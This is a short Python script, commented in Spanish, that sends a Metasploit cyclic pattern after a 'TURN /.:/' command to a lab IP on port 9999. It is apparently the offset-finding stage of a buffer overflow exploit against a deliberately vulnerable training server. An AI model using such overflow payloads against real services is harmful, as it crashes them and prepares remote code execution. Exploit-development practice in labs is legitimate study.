#!/usr/bin/python3
import sys
import socket

# Offset generado con pattern_create.rb de Metasploit
offset = (
    "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9"
    "Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9"
)

TARGET_IP = "10.0.2.17"
PORT = 9999

try:
    # Crear socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_IP, PORT))

    # Enviar payload
    payload = f"TURN /.:/{offset}"
    s.send(payload.encode())  # Convertir a bytes

    # Cerrar conexión
    s.close()

except Exception as e:
    print(f"Error conectando al servidor: {e}")
    sys.exit()
